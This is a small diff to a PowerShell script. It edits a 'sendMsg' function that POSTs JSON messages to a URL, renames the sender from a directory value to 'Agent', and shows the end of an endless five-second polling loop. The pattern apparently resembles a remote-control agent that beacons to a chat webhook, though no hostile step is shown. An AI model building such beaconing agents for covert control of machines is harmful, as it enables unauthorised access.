@@ -84,7 +84,7 @@ function sendMsg {
     if ($Message) {
             $jsonBody = @{
                 "content" = "$Message"
-                "username" = "$dir"
+                "username" = "Agent"
             } | ConvertTo-Json
             $webClient.Headers.Add("Content-Type", "application/json")
             $response = $webClient.UploadString($url, "POST", $jsonBody)
@@ -167,3 +167,4 @@ while ($true) {
     }
     sleep 5
 }
+
